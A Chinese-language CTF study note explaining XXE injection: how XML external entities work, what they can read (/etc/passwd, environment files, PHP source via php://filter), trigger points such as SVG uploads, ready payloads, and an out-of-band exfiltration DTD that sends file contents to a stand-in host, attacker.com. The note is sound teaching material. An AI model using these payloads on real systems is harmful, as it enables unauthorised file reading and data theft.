# 09 · XXE

# 一、是什么

**XXE = XML External Entity Injection**

> **程序解析了"包含恶意外部实体"的 XML** → **读本地文件 / SSRF / 甚至 RCE**。

**根因**：XML 解析器**没禁用外部实体**，用户可控的 XML 被解析。

# 二、XML 实体

XML 里 `<!ENTITY ...>` 定义"实体"（类似变量），引用时 `&名;` 被替换。

```xml
<!-- 内部实体（无害） -->
<!ENTITY a "hello">
<root>&a;</root>              <!-- 变成 hello -->

<!-- 外部实体（危险） -->
<!ENTITY a SYSTEM "file:///etc/passwd">
<root>&a;</root>              <!-- 去读文件！ -->
```

# 三、能读什么 / 危害

| 目标 | `SYSTEM` 指向 |
|---|---|
| **读本地文件** | `file:///etc/passwd`、`file:///flag` |
| **读 PHP 源码** | `php://filter/convert.base64-encode/resource=/var/www/html/config.php` |
| **SSRF（内网）** | `http://127.0.0.1/admin`、`http://内网IP/` |
| **RCE（特定）** | `expect://`（罕见） |

# 四、触发点（在哪解析 XML）

| 触发点 | 说明 |
|---|---|
| **上传 XML 文件被解析** | 直接 |
| **上传 SVG** | **SVG 就是 XML**，图片处理时被解析 |
| **提交 XML 格式数据** | POST body，`Content-Type: application/xml` |
| **SOAP / SAML 接口** | 协议本身就是 XML |

# 五、最简 payload

```xml
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///flag">]>
<r><name>&x;</name></r>
```

**三个必须遵守的规则**：
| 规则 | 违反后果 |
|---|---|
| 根元素名必须**匹配目标** | 解析成功但后端取不到数据 |
| 实体要放在**会回显的字段**里 | 读了文件但看不到 |
| `SYSTEM` 后必须有**空格** | 解析失败 |

**`file:///` 是三斜杠**：
```
file://      ← 协议 + 空主机名
      /flag  ← 绝对路径
```

**常用路径**：
```
Linux:   /flag  /flag.txt  /etc/passwd  /proc/self/environ  /root/flag
Windows: C:/Windows/win.ini  C:/Users/Administrator/Desktop/flag.txt
```

# 六、SVG XXE（**图片上传点常中**）

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="20">&xxe;</text>
</svg>
```

**网站解析 SVG 时，`&xxe;` 触发读 `/flag` → 内容显示在 text 里。**

# 七、无回显 → 带外 XXE

**如果页面不回显**，用**参数实体 + 外带**：

```xml
<!-- 攻击者服务器上的 evil.dtd -->
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;

<!-- 发送的 XML -->
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<foo>x</foo>
```

**参数实体用 `%名;` 引用**（不是 `&名;`）。

# 八、做题套路

```
① 发现"能上传/提交 XML 或 SVG，且会被解析"的点
② 先测实体是否解析：传 <!ENTITY x "test">，看 &x; 是否显示 test
③ 能用 → 换外部实体读文件：file:///etc/passwd
④ 读 PHP 源码要 base64：php://filter/read=convert.base64-encode/resource=flag.php
⑤ 读不到 → 试 OOB 带外
```

# 九、一句话

> **XXE = XML 解析器没禁用外部实体**。**`<!ENTITY 名 SYSTEM "file:///flag">` + `&名;` = 读文件**。**SVG 是 XML → 图片上传点可能中**。**读 PHP 源码配合 `php://filter` + base64**。**无回显用参数实体 + 外带（OOB）**。
